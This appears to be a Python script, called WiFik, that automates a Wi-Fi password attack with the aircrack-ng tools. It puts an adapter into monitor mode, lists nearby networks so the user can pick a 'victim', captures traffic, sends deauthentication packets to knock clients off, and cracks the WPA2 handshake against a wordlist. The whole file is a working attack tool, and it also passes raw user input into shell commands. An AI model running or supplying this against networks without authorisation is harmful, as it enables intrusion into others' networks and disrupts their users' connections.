import os
import csv

class WiFik:
    def __init__(self):
        self.interface = ""
        self.access_points, self.stations = [], []
        self.ap = {}
        
    def handle_wifi_interface(self):
        self.interface = input("what interface do you want to use?(if u do not know:press Enter), most probably it is wlan0 and after this script it will change to wlan0mon.\nInterface: ")
        if not self.interface:
            os.system("ip a | grep -E \":*: <\"")
            self.handle_wifi_interface()
            return
        
        if "mon" in self.interface: return

        os.system("airmon-ng check kill")
        os.system("airmon-ng start "+self.interface)
        self.interface = self.interface+"mon"


    def dump_wifi_aps(self):
        print(self.interface)
        os.system("airodump-ng -w ./dumps/dump --output-format csv "+self.interface)
        os.system("ls -l dumps | grep dump")

        file = ""
        while "dump" not in file: file = input("Choose dumps-<n>.csv file: ")
        file_path = "dumps/" + file

        with open(file_path, newline='') as csvfile:
            reader = csv.reader(csvfile)
            access_points, stations = [], []
            reading_ap = True 

            for row in reader:
                if row:
                    if 'BSSID' in row:
                        reading_ap = True
                    elif 'Station MAC' in row:
                        reading_ap = False
                    else:
                        if reading_ap:
                            access_points.append({
                                "BSSID": row[0],
                                "First time seen": row[1],
                                "Last time seen": row[2],
                                "channel": int(row[3].strip()) if row[3].strip().isdigit() else None,
                                "Speed": int(row[4].strip()) if row[4].strip().isdigit() else None,
                                "Privacy": row[5],
                                "Cipher": row[6],
                                "Authentication": row[7],
                                "Power": int(row[8].strip()) if row[8].strip().lstrip('-').isdigit() else None,
                                "# beacons": int(row[9].strip()) if row[9].strip().isdigit() else None,
                                "# IV": int(row[10].strip()) if row[10].strip().isdigit() else None,
                                "LAN IP": row[11],
                                "ID-length": int(row[12].strip()) if row[12].strip().isdigit() else None,
                                "ESSID": row[13],
                                "Key": row[14] if len(row) > 14 else None
                            })
                        else:
                            stations.append({
                                "Station MAC": row[0],
                                "First time seen": row[1],
                                "Last time seen": row[2],
                                "Power": int(row[3].strip()) if row[3].strip().lstrip('-').isdigit() else None,
                                "# packets": int(row[4].strip()) if row[4].strip().isdigit() else None,
                                "BSSID": row[5],
                                "Probed ESSIDs": row[6] if len(row) > 6 else None
                            })

        self.access_points, self.stations = access_points, stations

    def handle_victim_choosing(self):
        l = len(self.access_points)
        print("Choose WiFi to crack:")
        print("#   | BSSID".ljust(26), "|", "ESSID".ljust(30), "|", "channel".ljust(8), "|", "#stations")
        for i in range(l):
            ap = self.access_points[i]
            print(str(i).ljust(3), "|", ap["BSSID"].ljust(20), "|", ap["ESSID"].ljust(30), "|", str(ap["channel"]).ljust(8), end=" | ")
            num_stations = 0
            for station in self.stations:
                if ap["BSSID"] in station["BSSID"]:
                    num_stations += 1
            print(num_stations)
        num = ""
        while num not in list(range(0,l)) : num = int(input("Number: "))
        self.ap = self.access_points[num]

    def dump_packet(self):
        os.system("xterm -e airodump-ng -c " + str(self.ap["channel"]) + " --bssid " + self.ap["BSSID"] + " -w ./outputs/ " + self.interface + " &")
        input("Wait a while till devices are detected... Then press Enter")

    def deauth_aps(self):
        n = ""
        while not n: n = input("Enter number of deauth packets: ")
        os.system("aireplay-ng -0 " + n + " -a " + str(self.ap["BSSID"]) + " " + self.interface)
        
    def crack(self):
        os.system("ls -l outputs/ | grep cap")
        cap = "outputs/" + input("Path to <n>.cap file: ")
        os.system("ls -l wordlists/ | grep txt")
        wordlist = "wordlists/" + input("Path to wordlist: ")
        os.system("aircrack-ng -a2 -b " + self.ap["BSSID"] + " -w " + wordlist + " " + cap)


def main():
    w = WiFik()
    while True:
        print("1. Start WiFi Cracking")
        print("2. Choose steps again")
        print("3. Exit")
        choice = input("Choose: ")
        if choice == "1":
            w.handle_wifi_interface()
            w.dump_wifi_aps()
            w.handle_victim_choosing()
            w.dump_packet()
            w.deauth_aps()
            w.crack()
        if choice == "2":
            while True:
                print("1. Choose WiFi interface")
                print("2. Dump WiFi APs")
                print("3. Choose victim")
                print("4. Dump packets")
                print("5. Deauth APs")
                print("6. Crack")
                print("7. Exit")
                choice2 = input("Choose: ")
                if choice2 == "1": w.handle_wifi_interface()
                if choice2 == "2": w.dump_wifi_aps()
                if choice2 == "3": w.handle_victim_choosing()
                if choice2 == "4": w.dump_packet()
                if choice2 == "5": w.deauth_aps()
                if choice2 == "6": w.crack()
                if choice2 == "7": break
        if choice == "3": 
            print("Bye!")
            break

main()
